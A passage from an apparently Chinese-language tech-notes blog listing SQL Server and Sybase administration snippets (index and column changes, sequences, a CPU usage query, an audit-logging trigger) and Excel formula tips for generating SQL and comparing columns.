INDEX table_name.index_name</span><br><span class="line"><span class="keyword">END</span></span><br><span class="line">GO</span><br></pre></td></tr></table></figure><h2 id="索引的操作"><a href="#索引的操作" class="headerlink" title="索引的操作"></a>索引的操作</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 删除主键</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> db_test.table_name <span class="keyword">drop</span> <span class="keyword">constraint</span> index_name</span><br><span class="line"></span><br><span class="line"># 删除普通索引</span><br><span class="line"><span class="keyword">DROP</span> index index_name <span class="keyword">on</span> db_test.table_name</span><br><span class="line"></span><br><span class="line"># 新建唯一索引</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> INDEX index_name <span class="keyword">ON</span> db_test.table_name (seq)</span><br><span class="line"></span><br><span class="line"># 新建主键</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> db_test.table_name <span class="keyword">add</span> <span class="keyword">constraint</span> index_name <span class="keyword">PRIMARY</span> key(seq)</span><br></pre></td></tr></table></figure><h2 id="列的操作"><a href="#列的操作" class="headerlink" title="列的操作"></a>列的操作</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 重命名列名，索引中的列名会自动更改</span><br><span class="line"><span class="keyword">EXEC</span> sp_rename <span class="string">&#x27;db_test.table_name.id_type&#x27;</span>,<span class="string">&#x27;id_type_before&#x27;</span>,<span class="string">&#x27;COLUMN&#x27;</span></span><br><span class="line"></span><br><span class="line"># 更改列的类型</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> db_test.table_name <span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> id_type_before <span class="type">char</span>(<span class="number">24</span>) <span class="keyword">NULL</span></span><br><span class="line"></span><br><span class="line"># 新增列</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> db_test.table_name <span class="keyword">ADD</span> id_type_before <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">NULL</span></span><br><span class="line"></span><br><span class="line"># 删除列</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> db_test.table_name <span class="keyword">DROP</span> <span class="keyword">COLUMN</span> id_type_before</span><br></pre></td></tr></table></figure><h2 id="获取下一个sequence"><a href="#获取下一个sequence" class="headerlink" title="获取下一个sequence"></a>获取下一个sequence</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">sql</span> server</span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@tm_new_detail_id</span> <span class="type">numeric</span>(<span class="number">20</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@tm_new_detail_id</span> <span class="operator">=</span> <span class="keyword">CONVERT</span>(<span class="type">numeric</span>(<span class="number">20</span>, <span class="number">0</span>), NEXT <span class="keyword">VALUE</span> <span class="keyword">FOR</span> db_test.seq_name)</span><br><span class="line"></span><br><span class="line">#SYBASE</span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@new_cust_detail_id</span> unsigned <span class="type">bigint</span></span><br><span class="line"><span class="keyword">select</span> <span class="variable">@new_cust_detail_id</span> <span class="operator">=</span> <span class="keyword">convert</span>(unsigned <span class="type">bigint</span>, reserve_identity(<span class="string">&#x27;seq_name&#x27;</span>,<span class="number">1</span>)) </span><br></pre></td></tr></table></figure><h2 id="查看表锁级别"><a href="#查看表锁级别" class="headerlink" title="查看表锁级别"></a>查看表锁级别</h2><p><code>select lockscheme(&#39;db_test..table_name&#39;)</code></p><h2 id="查包含某字符串的存储过程"><a href="#查包含某字符串的存储过程" class="headerlink" title="查包含某字符串的存储过程"></a>查包含某字符串的存储过程</h2><p><code>select distinct object_name(id) from syscomments where id in(select id from sysobjects where type =&#39;P&#39;) and text like &#39;%find_string%&#39;</code></p><h2 id="查看不包含数字"><a href="#查看不包含数字" class="headerlink" title="查看不包含数字"></a>查看不包含数字</h2><p><code>select * from customer a where PATINDEX(&#39;%[0-9]%&#39;, a.name) = 0 </code></p><h2 id="查询SQL执行时CPU的占用情况"><a href="#查询SQL执行时CPU的占用情况" class="headerlink" title="查询SQL执行时CPU的占用情况"></a>查询SQL执行时CPU的占用情况</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WITH</span> AggregatedCPU <span class="keyword">AS</span> (<span class="keyword">SELECT</span> q.query_hash, <span class="built_in">SUM</span>(count_executions <span class="operator">*</span> avg_cpu_time <span class="operator">/</span> <span class="number">1000.0</span>) <span class="keyword">AS</span> total_cpu_millisec, <span class="built_in">SUM</span>(count_executions <span class="operator">*</span> avg_cpu_time <span class="operator">/</span> <span class="number">1000.0</span>)<span class="operator">/</span> <span class="built_in">SUM</span>(count_executions) <span class="keyword">AS</span> avg_cpu_millisec, <span class="built_in">MAX</span>(rs.max_cpu_time <span class="operator">/</span> <span class="number">1000.00</span>) <span class="keyword">AS</span> max_cpu_millisec, <span class="built_in">MIN</span>(rs.min_cpu_time <span class="operator">/</span> <span class="number">1000.00</span>) <span class="keyword">AS</span> min_cpu_millisec,<span class="built_in">MAX</span>(max_logical_io_reads) max_logical_reads, <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> p.plan_id) <span class="keyword">AS</span> number_of_distinct_plans, <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> p.query_id) <span class="keyword">AS</span> number_of_distinct_query_ids, <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> rs.execution_type_desc<span class="operator">=</span><span class="string">&#x27;Aborted&#x27;</span> <span class="keyword">THEN</span> count_executions <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">AS</span> Aborted_Execution_Count, <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> rs.execution_type_desc<span class="operator">=</span><span class="string">&#x27;Regular&#x27;</span> <span class="keyword">THEN</span> count_executions <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">AS</span> Regular_Execution_Count, <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> rs.execution_type_desc<span class="operator">=</span><span class="string">&#x27;Exception&#x27;</span> <span class="keyword">THEN</span> count_executions <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">AS</span> Exception_Execution_Count, <span class="built_in">SUM</span>(count_executions) <span class="keyword">AS</span> total_executions, <span class="built_in">MIN</span>(qt.query_sql_text) <span class="keyword">AS</span> sampled_query_text</span><br><span class="line"><span class="keyword">FROM</span> sys.query_store_query_text <span class="keyword">AS</span> qt</span><br><span class="line"><span class="keyword">JOIN</span> sys.query_store_query <span class="keyword">AS</span> q <span class="keyword">ON</span> qt.query_text_id<span class="operator">=</span>q.query_text_id</span><br><span class="line"><span class="keyword">JOIN</span> sys.query_store_plan <span class="keyword">AS</span> p <span class="keyword">ON</span> q.query_id<span class="operator">=</span>p.query_id</span><br><span class="line"><span class="keyword">JOIN</span> sys.query_store_runtime_stats <span class="keyword">AS</span> rs <span class="keyword">ON</span> rs.plan_id<span class="operator">=</span>p.plan_id</span><br><span class="line"><span class="keyword">JOIN</span> sys.query_store_runtime_stats_interval <span class="keyword">AS</span> rsi <span class="keyword">ON</span> rsi.runtime_stats_interval_id<span class="operator">=</span>rs.runtime_stats_interval_id</span><br><span class="line"><span class="keyword">WHERE</span> rs.execution_type_desc <span class="keyword">IN</span> (<span class="string">&#x27;Regular&#x27;</span>, <span class="string">&#x27;Aborted&#x27;</span>, <span class="string">&#x27;Exception&#x27;</span>)<span class="keyword">AND</span> rsi.start_time<span class="operator">&gt;=</span><span class="string">&#x27;2022-05-09 06:00:00&#x27;</span> <span class="comment">--AND rsi.start_time&lt;=&#x27;2021-10-28 05:00:00&#x27;</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> q.query_hash), OrderedCPU <span class="keyword">AS</span> (<span class="keyword">SELECT</span> query_hash, total_cpu_millisec, avg_cpu_millisec, max_cpu_millisec, min_cpu_millisec,max_logical_reads, number_of_distinct_plans, number_of_distinct_query_ids, total_executions, Aborted_Execution_Count, Regular_Execution_Count, Exception_Execution_Count, sampled_query_text, <span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span> (<span class="keyword">ORDER</span> <span class="keyword">BY</span> total_cpu_millisec <span class="keyword">DESC</span>, query_hash <span class="keyword">ASC</span>) <span class="keyword">AS</span> RN</span><br><span class="line"><span class="keyword">FROM</span> AggregatedCPU)</span><br><span class="line"><span class="keyword">SELECT</span> OD.query_hash, OD.total_cpu_millisec, OD.avg_cpu_millisec, OD.max_cpu_millisec, OD.min_cpu_millisec,OD.max_logical_reads, OD.number_of_distinct_plans, OD.number_of_distinct_query_ids, OD.total_executions, OD.Aborted_Execution_Count, OD.Regular_Execution_Count, OD.Exception_Execution_Count, OD.sampled_query_text, OD.RN</span><br><span class="line"><span class="keyword">FROM</span> OrderedCPU <span class="keyword">AS</span> OD</span><br><span class="line"><span class="keyword">WHERE</span> OD.RN<span class="operator">&lt;=</span><span class="number">100</span> <span class="comment">-- and sampled_query_text like &#x27;%VS9251B%&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> total_cpu_millisec <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure><h2 id="触发器记录数据的IUD操作"><a href="#触发器记录数据的IUD操作" class="headerlink" title="触发器记录数据的IUD操作"></a>触发器记录数据的IUD操作</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">#创建日志表</span><br><span class="line">USE [db_test]</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> ANSI_NULLS <span class="keyword">ON</span></span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> QUOTED_IDENTIFIER <span class="keyword">ON</span></span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">IF  <span class="keyword">exists</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> type <span class="operator">=</span> <span class="string">&#x27;U&#x27;</span> <span class="keyword">and</span> name <span class="operator">=</span> <span class="string">&#x27;table_name&#x27;</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> [dbo].[table_name]</span><br><span class="line"><span class="keyword">END</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> [dbo].[table_name_log]</span><br><span class="line">(</span><br><span class="line">    [file_content] [<span class="type">char</span>](<span class="number">150</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    [spid] <span class="type">int</span> <span class="keyword">NULL</span>,</span><br><span class="line">    [prog_name] [<span class="type">varchar</span>](<span class="number">100</span>) <span class="keyword">NULL</span>,</span><br><span class="line">    [user_name] [<span class="type">varchar</span>](<span class="number">100</span>) <span class="keyword">NULL</span>,</span><br><span class="line">    [hostname] <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">NULL</span>,</span><br><span class="line">    [ip_address] <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">NULL</span>,</span><br><span class="line">    [action_type] [<span class="type">varchar</span>](<span class="number">40</span>)  <span class="keyword">NULL</span>,</span><br><span class="line">    [update_time] [datetime]  <span class="keyword">NULL</span></span><br><span class="line">)</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">#创建触发器</span><br><span class="line">USE [db_test]</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">IF OBJECT_ID (<span class="string">&#x27;dbo.trigger_name&#x27;</span>, <span class="string">&#x27;TR&#x27;</span>) <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TRIGGER</span> [dbo].[trigger_name]</span><br><span class="line"><span class="keyword">END</span></span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> ANSI_NULLS <span class="keyword">ON</span></span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> QUOTED_IDENTIFIER <span class="keyword">ON</span></span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> [dbo].[trigger_name]</span><br><span class="line"><span class="keyword">ON</span> [dbo].[table_name] <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>,<span class="keyword">INSERT</span>,<span class="keyword">DELETE</span></span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@op</span> <span class="type">varchar</span>(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="variable">@op</span><span class="operator">=</span><span class="keyword">case</span> <span class="keyword">when</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> inserted) <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> deleted)</span><br><span class="line">                    <span class="keyword">then</span> <span class="string">&#x27;Update&#x27;</span></span><br><span class="line">                <span class="keyword">when</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> inserted) <span class="keyword">and</span> <span class="keyword">not</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> deleted)</span><br><span class="line">                    <span class="keyword">then</span> <span class="string">&#x27;Insert&#x27;</span></span><br><span class="line">                <span class="keyword">when</span> <span class="keyword">not</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> inserted) <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> deleted)</span><br><span class="line">                    <span class="keyword">then</span> <span class="string">&#x27;Delete&#x27;</span> <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">if <span class="variable">@op</span> <span class="operator">=</span> <span class="string">&#x27;Update&#x27;</span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="keyword">insert</span> <span class="keyword">into</span> [dbo].[table_name_log]</span><br><span class="line">        (file_content,spid,prog_name,user_name,hostname,ip_address,action_type,update_time)</span><br><span class="line">        <span class="keyword">select</span> file_content,</span><br><span class="line">               @<span class="variable">@spid</span>,</span><br><span class="line">               (<span class="keyword">select</span> program_name <span class="keyword">as</span> prog_name <span class="keyword">from</span> sys.dm_exec_sessions <span class="keyword">where</span> session_id<span class="operator">=</span>@<span class="variable">@spid</span>),</span><br><span class="line">               (<span class="keyword">select</span> login_name <span class="keyword">as</span> user_name <span class="keyword">from</span> sys.dm_exec_sessions <span class="keyword">where</span> session_id<span class="operator">=</span>@<span class="variable">@spid</span>),</span><br><span class="line">               (<span class="keyword">select</span> hostname <span class="keyword">as</span> hostname <span class="keyword">from</span> sys.sysprocesses <span class="keyword">where</span> spid<span class="operator">=</span>@<span class="variable">@spid</span>),</span><br><span class="line">               (<span class="keyword">select</span> client_net_address <span class="keyword">as</span> ip_address <span class="keyword">from</span> sys.dm_exec_connections <span class="keyword">where</span> session_id<span class="operator">=</span>@<span class="variable">@spid</span>),</span><br><span class="line">               <span class="string">&#x27;Before Update&#x27;</span>,</span><br><span class="line">               getdate()</span><br><span class="line">        <span class="keyword">from</span> deleted</span><br><span class="line"></span><br><span class="line">        <span class="keyword">insert</span> <span class="keyword">into</span> [dbo].[table_name_log]</span><br><span class="line">        (file_content,spid,prog_name,user_name,hostname,ip_address,action_type,update_time)</span><br><span class="line">        <span class="keyword">select</span> file_content,</span><br><span class="line">               @<span class="variable">@spid</span>,</span><br><span class="line">               (<span class="keyword">select</span> program_name <span class="keyword">as</span> prog_name <span class="keyword">from</span> sys.dm_exec_sessions <span class="keyword">where</span> session_id<span class="operator">=</span>@<span class="variable">@spid</span>),</span><br><span class="line">               (<span class="keyword">select</span> login_name <span class="keyword">as</span> user_name <span class="keyword">from</span> sys.dm_exec_sessions <span class="keyword">where</span> session_id<span class="operator">=</span>@<span class="variable">@spid</span>),</span><br><span class="line">               (<span class="keyword">select</span> hostname <span class="keyword">as</span> hostname <span class="keyword">from</span> sys.sysprocesses <span class="keyword">where</span> spid<span class="operator">=</span>@<span class="variable">@spid</span>),</span><br><span class="line">               (<span class="keyword">select</span> client_net_address <span class="keyword">as</span> ip_address <span class="keyword">from</span> sys.dm_exec_connections <span class="keyword">where</span> session_id<span class="operator">=</span>@<span class="variable">@spid</span>),</span><br><span class="line">               <span class="string">&#x27;After Update&#x27;</span>,</span><br><span class="line">               getdate()</span><br><span class="line">        <span class="keyword">from</span> inserted</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">else</span> if <span class="variable">@op</span> <span class="operator">=</span> <span class="string">&#x27;Delete&#x27;</span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="keyword">insert</span> <span class="keyword">into</span> [dbo].[table_name_log]</span><br><span class="line">        (file_content,spid,prog_name,user_name,hostname,ip_address,action_type,update_time)</span><br><span class="line">        <span class="keyword">select</span> file_content,</span><br><span class="line">               @<span class="variable">@spid</span>,</span><br><span class="line">               (<span class="keyword">select</span> program_name <span class="keyword">as</span> prog_name <span class="keyword">from</span> sys.dm_exec_sessions <span class="keyword">where</span> session_id<span class="operator">=</span>@<span class="variable">@spid</span>),</span><br><span class="line">               (<span class="keyword">select</span> login_name <span class="keyword">as</span> user_name <span class="keyword">from</span> sys.dm_exec_sessions <span class="keyword">where</span> session_id<span class="operator">=</span>@<span class="variable">@spid</span>),</span><br><span class="line">               (<span class="keyword">select</span> hostname <span class="keyword">as</span> hostname <span class="keyword">from</span> sys.sysprocesses <span class="keyword">where</span> spid<span class="operator">=</span>@<span class="variable">@spid</span>),</span><br><span class="line">               (<span class="keyword">select</span> client_net_address <span class="keyword">as</span> ip_address <span class="keyword">from</span> sys.dm_exec_connections <span class="keyword">where</span> session_id<span class="operator">=</span>@<span class="variable">@spid</span>),</span><br><span class="line">               <span class="variable">@op</span>,</span><br><span class="line">               getdate()</span><br><span class="line">        <span class="keyword">from</span> deleted</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="keyword">insert</span> <span class="keyword">into</span> [dbo].[table_name_log]</span><br><span class="line">        (file_content,spid,prog_name,user_name,hostname,ip_address,action_type,update_time)</span><br><span class="line">        <span class="keyword">select</span> file_content,</span><br><span class="line">               @<span class="variable">@spid</span>,</span><br><span class="line">               (<span class="keyword">select</span> program_name <span class="keyword">as</span> prog_name <span class="keyword">from</span> sys.dm_exec_sessions <span class="keyword">where</span> session_id<span class="operator">=</span>@<span class="variable">@spid</span>),</span><br><span class="line">               (<span class="keyword">select</span> login_name <span class="keyword">as</span> user_name <span class="keyword">from</span> sys.dm_exec_sessions <span class="keyword">where</span> session_id<span class="operator">=</span>@<span class="variable">@spid</span>),</span><br><span class="line">               (<span class="keyword">select</span> hostname <span class="keyword">as</span> hostname <span class="keyword">from</span> sys.sysprocesses <span class="keyword">where</span> spid<span class="operator">=</span>@<span class="variable">@spid</span>),</span><br><span class="line">               (<span class="keyword">select</span> client_net_address <span class="keyword">as</span> ip_address <span class="keyword">from</span> sys.dm_exec_connections <span class="keyword">where</span> session_id<span class="operator">=</span>@<span class="variable">@spid</span>),</span><br><span class="line">               <span class="variable">@op</span>,</span><br><span class="line">               getdate()</span><br><span class="line">        <span class="keyword">from</span> inserted</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">END</span></span><br><span class="line">GO</span><br></pre></td></tr></table></figure><h2 id="查看数据库指定schema下所有表是否有主键约束和唯一索引-SQL-Server"><a href="#查看数据库指定schema下所有表是否有主键约束和唯一索引-SQL-Server" class="headerlink" title="查看数据库指定schema下所有表是否有主键约束和唯一索引(SQL Server)"></a>查看数据库指定schema下所有表是否有主键约束和唯一索引(SQL Server)</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.name <span class="operator">+</span> <span class="string">&#x27;.&#x27;</span> <span class="operator">+</span> t.name <span class="keyword">AS</span> table_name,</span><br><span class="line">(<span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="number">1</span>) <span class="keyword">from</span> sys.indexes i <span class="keyword">where</span>  t.object_id <span class="operator">=</span> i.object_id <span class="keyword">and</span> is_unique <span class="operator">=</span> <span class="number">1</span>) <span class="operator">&gt;=</span><span class="number">1</span> <span class="keyword">then</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">end</span>) <span class="keyword">as</span> has_unique,</span><br><span class="line">(<span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="number">1</span>) <span class="keyword">from</span> sys.indexes i <span class="keyword">where</span>  t.object_id <span class="operator">=</span> i.object_id <span class="keyword">and</span> is_primary_key <span class="operator">=</span> <span class="number">1</span>) <span class="operator">&gt;=</span><span class="number">1</span> <span class="keyword">then</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">end</span>) <span class="keyword">as</span> has_primary</span><br><span class="line"><span class="keyword">FROM</span> sys.tables t</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> sys.schemas s <span class="keyword">ON</span> t.schema_id <span class="operator">=</span> s.schema_id</span><br><span class="line"><span class="keyword">WHERE</span> t.type <span class="operator">=</span> <span class="string">&#x27;U&#x27;</span> <span class="keyword">and</span> s.name <span class="operator">=</span> <span class="string">&#x27;dbo&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ISNULL与NULLIF函数区别-SQL-Server"><a href="#ISNULL与NULLIF函数区别-SQL-Server" class="headerlink" title="ISNULL与NULLIF函数区别(SQL Server)"></a>ISNULL与NULLIF函数区别(SQL Server)</h2><p><code>ISNULL(check_expression, replacement_value)</code></p><ul><li>如果 check_expression 为 NULL，则返回 replacement_value</li><li>如果 check_expression 不为 NULL，则返回 check_expression</li></ul><p><code>NULLIF(expression, expression)</code></p><ul><li>如果两个 expression 相等，则返回 NULL，该 NULL 为第一个 expression 的数据类型</li><li>如果两个 expression 不相等，则返回第一个 expression</li></ul><h2 id="存储过程的两个参数-QUOTED-IDENTIFIER-和-ANSI-NULLS"><a href="#存储过程的两个参数-QUOTED-IDENTIFIER-和-ANSI-NULLS" class="headerlink" title="存储过程的两个参数(QUOTED_IDENTIFIER 和 ANSI_NULLS)"></a>存储过程的两个参数(QUOTED_IDENTIFIER 和 ANSI_NULLS)</h2><p><code>QUOTED_IDENTIFIER</code></p><ul><li>SET QUOTED_IDENTIFIER ON：与系统关键字重复的，允许使用双引号括起来，就能正常使用。注意是双引号</li><li>SET QUOTED_IDENTIFIER OFF：与系统关键字重复的，不允许使用</li></ul><p><code>ANSI_NULLS</code></p><ul><li>SET ANSI_NULLS ON：只能使用IS NULL来判断值是否为NULL，而不能使用&#x3D;或&lt;&gt;来与NULL做比较，任何值包括NULL值与NULL值做&#x3D;或&lt;&gt;运算都得到FALSE</li><li>SET ANSI_NULLS OFF：可以使用&#x3D;和&lt;&gt;来与NULL做BOOL运算</li></ul><hr><h1 id="Excel"><a href="#Excel" class="headerlink" title="Excel"></a>Excel</h1><blockquote><p><a href="https://baijiahao.baidu.com/s?id=1660947286175591245&wfr=spider&for=pc">Excel中$是什么意思</a>，$在Excel中是对数据区域的绝对引用，表示固定单元格中的行列，没有$则表示相对引用<br>跨sheet操作只需要光标在参数前，点击对应sheet tab就行，同个参数只需要一次这样的操作</p></blockquote><p><strong>生成SQL：</strong></p><ol><li>这一列的文本类型选 <code>general </code></li><li>公式文本框输入<code>=&quot;&#39;&quot;&amp;A1&amp;&quot;&#39;,&quot;</code></li></ol><p><strong>快速填充整列：</strong></p><ol><li>左上角输入 D2:D414716，按住ctrl+enter，光标移到公式后，继续按住ctrl+enter</li></ol><p><strong>判断两列内容是否相同：</strong></p><ol><li>这一列的文本类型选 <code>general </code></li><li><code>=IF((A1=B1),TRUE,FALSE)</code></li></ol><p><strong>判断C列中的内容有没有在B列中出现过：</strong></p><ol><li>这一列的文本类型选 <code>general </code></li><li><code>=COUNTIF(B:B,C2)</code></li><li>指定范围并且跨sheet判断则是：<code>=COUNTIF(Sheet1!$B$1:Sheet1!$B$7,C1)</code></li><li>结果为0的，就是B列中没有出现过的，而结果不为0，则是在B列中出现过</li></ol><p><strong>快速生成字母开头的连续序号：</strong></p><ol><li>这一列的文本类型选 <code>general </code></li><li><code>=&quot;T&quot;&amp;TEXT(0+ROW(A1),&quot;0000&quot;)</code></li><li>第一行就是T0001,下一行就是T0002</li></ol><p><strong>快速生成sql的in条件（2000个参数）：</strong></p><ol><li>这一列的文本类型选 <code>general </code></li><li><code>=IF(EXACT(MOD(ROW()-2,2000),0),=TEXTJOIN(&quot;&#39; ,&#39; &quot;,TRUE,A2:A2001),&quot;&quot;)</code></li><li>结果：1’,’2’,’3….’,’2000</li></ol><p><strong>快速根据key获取key所在行的所有数据：</strong></p><ol><li>在sheet2中根据A列的值获取sheet1中A列对应值所在行的所有数据</li><li>将sheet2的B列的文本类型选 <code>general </code></li><li><code>=VLOOKUP($A1,Sheet1!$A$2:$AL$1001,COLUMN(Sheet1!B1),0)</code></li><li>$A1是要基于其返回整行的查找值， Sheet1!$A$2:$AL$1001是要查找的数据范围， COLUMN(Sheet1!B1)表示数据范围内的第二列号，0表示精确查找</li><li>数据量太大导致卡死，可参考<a href="http://www.360doc.com/content/21/0704/21/73091064_985122855.shtml">Power 